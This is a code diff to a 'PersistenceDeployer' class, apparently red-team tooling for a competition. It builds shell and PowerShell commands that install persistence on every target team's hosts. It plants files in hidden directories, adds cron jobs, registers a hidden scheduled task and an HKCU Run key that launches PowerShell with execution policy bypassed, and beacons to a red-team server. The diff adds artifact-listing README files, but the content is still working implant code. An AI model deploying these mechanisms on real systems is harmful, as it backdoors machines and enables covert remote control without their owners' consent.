@@ -1248,6 +1248,8 @@ class PersistenceDeployer:
         linux_cmd = f'''
 SMH_DIR="/tmp/.aperture_science"
 RED_TEAM_SERVER="http://{red_team_ip}:8080"
+CRON_SMH="*/5 * * * * $SMH_DIR/smh --maintain # APERTURE_PERSISTENCE"
+CRON_TURRET="*/3 * * * * $SMH_DIR/turret # APERTURE_PERSISTENCE"
 
 mkdir -p "$SMH_DIR"
 cat > "$SMH_DIR/smh" << 'SMH'
@@ -1279,7 +1281,7 @@ esac
 SMH
 chmod +x "$SMH_DIR/smh"
 
-(crontab -l 2>/dev/null; echo "*/5 * * * * $SMH_DIR/smh --maintain") | crontab -
+(crontab -l 2>/dev/null | grep -v "APERTURE_PERSISTENCE"; echo "$CRON_SMH") | crontab -
 
 cat > "$SMH_DIR/turret" << 'TURRET'
 #!/bin/sh
@@ -1298,8 +1300,25 @@ if [ ! -f /tmp/.aperture_science/smh ]; then
 fi
 TURRET
 chmod +x "$SMH_DIR/turret"
-(crontab -l 2>/dev/null; echo "*/3 * * * * $SMH_DIR/turret") | crontab -
+(crontab -l 2>/dev/null | grep -v "APERTURE_PERSISTENCE"; echo "$CRON_TURRET") | crontab -
+
+cat > "$SMH_DIR/README.txt" << README
+Aperture Persistence (Linux)
+
+Files:
+ - /tmp/.aperture_science/smh
+ - /tmp/.aperture_science/turret
+
+Cron entries:
+ - */5 * * * * /tmp/.aperture_science/smh --maintain # APERTURE_PERSISTENCE
+ - */3 * * * * /tmp/.aperture_science/turret # APERTURE_PERSISTENCE
+
+Beacon target:
+ - http://{red_team_ip}:8080/beacon
+README
 echo "PERSISTENCE_DEPLOYED"
+echo "Artifacts: $SMH_DIR/smh $SMH_DIR/turret $SMH_DIR/README.txt"
+echo "Crontab tag: APERTURE_PERSISTENCE"
 '''
         windows_cmd = f'''
 $ApertureDir = "$env:TEMP\\ApertureScience"
@@ -1328,6 +1347,25 @@ $Settings = New-ScheduledTaskSettingsSet -Hidden
 Register-ScheduledTask -TaskName "ApertureEnrichment" -Action $Action -Trigger $Trigger -Settings $Settings -Force | Out-Null
 $RegPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
 Set-ItemProperty -Path $RegPath -Name "CompanionCube" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $ApertureDir\\smh.ps1 -Maintain"
+$Readme = @"
+Aperture Persistence (Windows)
+
+Files:
+ - $ApertureDir\\smh.ps1
+
+Scheduled Task:
+ - ApertureEnrichment (runs every 5 minutes)
+
+Run Key:
+ - HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -> CompanionCube
+
+Beacon target:
+ - http://{red_team_ip}:8080/beacon
+"@
+Set-Content -Path "$ApertureDir\\README.txt" -Value $Readme
 Write-Output "WHEATLEY_DEPLOYED"
+Write-Output "Artifacts: $ApertureDir\\smh.ps1 $ApertureDir\\README.txt"
+Write-Output "Scheduled Task: ApertureEnrichment"
+Write-Output "Run Key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\CompanionCube"
 '''
         return self.exec.exec_on_all_teams(targets, linux_cmd, windows_cmd)
